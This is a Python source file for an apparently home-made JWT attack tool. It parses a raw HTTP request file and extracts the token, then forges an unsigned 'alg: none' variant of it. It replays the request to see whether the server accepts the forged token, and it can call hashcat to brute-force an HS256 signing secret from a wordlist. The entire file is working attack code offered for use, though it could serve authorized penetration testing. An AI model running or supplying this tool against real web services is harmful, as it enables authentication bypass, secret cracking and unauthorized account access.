import jwt 
import subprocess
import argparse
import re
import requests
import base64 
import json

# Colors 
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"


## varaibles
jwtRegex = r"\*ey.*?\*"
OriginalResponse = ''
OriginalStatusCode = ''
AttackResponse = ''
AttackResponse = ''
AttackStatusCode = ''



def displayHeader(header):
    print(f"{'Key':<10} | {'Value':<10}")
    print('-'*23)

    for k,v in header.items():
        print(f"{YELLOW}{k:<10}{RESET} | {GREEN}{v:<10}{RESET}")

def bruteforce(token, algorithm):
    if algorithm == 'None':
        pass

    elif algorithm == 'HS256':
        cmd = [
            "hashcat",
            "-a", "0",
            "-m", "16500",
            token,
            "./jwtCommonlist/",
            "--quiet"
        ]

        try:
            subprocess.run(cmd, capture_output=True, text=True)

            show_cmd = [
                "hashcat",
                "-m", "16500",
                token,
                "--show"
            ]

            result = subprocess.run(show_cmd, capture_output=True, text=True)
            if result.stdout:
                password = result.stdout.split(':',1)[1]
            else :
                password = '' 

            print(f"{RESET}[+] Cracked result:{GREEN} ",end='')
            print(password if result.stdout else f"{RED}No password found{RESET}")
            print(RESET,end='')
        except Exception as e:
            print(f"[-] Error during bruteforce: {e}")

    else:
        print('algorithm mismatch')


## Get request from  files 
def getRequestFromFile(httpRequestFile):
    with open(f'{httpRequestFile}', 'r') as f:
        content = f.read()   
        return content     


## Build http request
def buildRequest(rawRequest):
    parts = re.split(r"\r?\n\r?\n", rawRequest, maxsplit=1)
    head = parts[0]
    body = parts[1] if len(parts) > 1 else ""

    lines = head.splitlines()

    # Request line
    request_line = lines[0].strip()
    parts = request_line.split()
    method = parts[0]
    path = parts[1] if len(parts) > 1 else ""

    # Headers
    headers = {}
    for line in lines[1:]:
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        headers[key.strip()] = value.strip()

    # Build URL
    host = headers.pop("Host", None)
    if not host:
        raise ValueError("Host header missing")
    url = f"https://{host}{path}"

    # Send request
    print(f"[+] Sending HTTP request at {url} ....")
    response = requests.request(method=method, url=url, headers=headers, data=body)
    print(f'Server responsded - status code : {GREEN}{response.status_code}{RESET} and Content Length : {GREEN}{len(response.content)}{RESET}')
    return response.status_code, response.content

def noneAlgattack(token):
    parts = token.split('.')
    header = jwt.get_unverified_header(token)
    header['alg'] = 'none'
    newHeader = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    return f"{newHeader}.{parts[1]}."


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-b","--bruteforce", help="Initiate the bruteforce process", action="store_true")
    parser.add_argument("-t","--token", help="JWT token argument", type=str, required=False, default='eyJhbGciOiJub25lIiwiZm9vbCI6ImZvb2wifQ.eyJmb29sIjoidHJ1ZSJ9.')
    parser.add_argument("-f", "--file", help="RAW HTTP request file ; TOken should be surounded by *ey........*")

    args = parser.parse_args()

    token = args.token 
    rawFileHttp = args.file

    header = jwt.get_unverified_header(token)


    
    # Handle data from file 
    if args.file:
        rawRequest = getRequestFromFile(rawFileHttp)
        match = re.search(jwtRegex, rawRequest)        

        if match:
            token = match.group().strip('*')
            header = jwt.get_unverified_header(token)
            displayHeader(header)
        tempRequest = re.sub(jwtRegex,f'{token}', rawRequest, count=1)
        buildRequest(tempRequest)

        algorithm = header.get('alg')

        noneToken = noneAlgattack(token)
        tempRequest = re.sub(jwtRegex,f'{noneToken}', rawRequest, count=1)
        buildRequest(tempRequest)



    else:
        displayHeader(header)



    if args.bruteforce:
        algorithm = header.get('alg')
        bruteforce(token, algorithm)



if __name__ == "__main__" : 
    main()

